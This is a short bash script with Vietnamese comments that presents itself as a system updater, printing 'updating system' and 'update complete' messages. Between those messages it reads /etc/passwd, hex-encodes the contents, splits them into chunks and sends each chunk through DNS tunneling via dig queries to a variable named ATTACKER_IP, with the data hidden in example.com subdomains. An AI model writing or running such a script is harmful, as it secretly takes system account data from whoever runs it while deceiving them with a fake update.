#!/bin/bash
echo "Đang cập nhật hệ thống..."

ATTACKER_IP="192.168.63.129"
DOMAIN="example.com"

# Thu thập dữ liệu từ tệp /etc/passwd
file="/etc/passwd"
# Mã hóa dạng hex (loại bỏ khoảng trắng và xuống dòng)
content=$(xxd -p "$file" | tr -d '\n')

# Chia dữ liệu thành các đoạn nhỏ (50 ký tự hex mỗi lần)
chunks=()
for ((i=0; i<${#content}; i+=50)); do
    chunk="${content:$i:50}"
    chunks+=("$chunk")
done

# Gửi từng chunk qua DNS tunneling
for i in "${!chunks[@]}"; do
    chunk="${chunks[$i]}"
    subdomain="$chunk.$i.$DOMAIN"
    dig +short @"$ATTACKER_IP" A "$subdomain" > /dev/null 2>&1
    sleep 0.1
done

echo "Cập nhật hệ thống hoàn tất!"